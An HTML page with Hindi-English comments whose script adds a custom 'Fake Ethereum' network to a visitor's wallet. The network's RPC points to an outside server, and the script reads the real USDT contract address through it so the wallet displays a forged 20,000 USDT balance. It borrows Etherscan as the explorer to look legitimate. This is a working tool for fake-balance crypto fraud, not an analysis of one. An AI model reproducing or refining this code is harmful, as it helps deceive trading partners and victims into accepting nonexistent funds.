<!DOCTYPE html>
<html>
<body>
    <h1>Fake USDT Test (20,000 USDT)</h1>
    <button onclick="switchNetwork()">Switch to Fake Network</button>
    <div id="balance"></div>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    <script>
        async function switchNetwork() {
            if (window.ethereum) {
                try {
                    // Fake network pe switch
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x1234', // Unique custom Chain ID
                            chainName: 'Fake Ethereum',
                            rpcUrls: ['https://fake-usdt-test.onrender.com/rpc'],
                            nativeCurrency: { name: 'Fake ETH', symbol: 'FETH', decimals: 18 },
                            blockExplorerUrls: ['https://etherscan.io'] // Dummy explorer
                        }]
                    });

                    // Provider aur signer setup
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    const signer = provider.getSigner();
                    const address = await signer.getAddress();

                    // Fake BNB/ETH balance (server se 0 aayega)
                    const balance = await provider.getBalance(address);
                    document.getElementById('balance').innerText = `Fake ETH: ${ethers.utils.formatEther(balance)} FETH`;

                    // Fake USDT balance (server se 20,000 USDT)
                    const fakeUsdtContract = new ethers.Contract(
                        '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Real USDT contract address
                        ['function balanceOf(address) view returns (uint256)'],
                        provider
                    );
                    const usdtBalance = await fakeUsdtContract.balanceOf(address);
                    document.getElementById('balance').innerHTML += `<br>Fake USDT: ${ethers.utils.formatUnits(usdtBalance, 18)} USDT`;

                    alert("Fake network pe switch ho gaya! Wallet mein check karo.");
                } catch (err) {
                    document.getElementById('balance').innerText = 'Error: ' + err.message;
                    alert('Network switch ya balance fetch mein error!');
                }
            } else {
                alert("Trust Wallet ya MetaMask chahiye!");
            }
        }
    </script>
</body>
</html>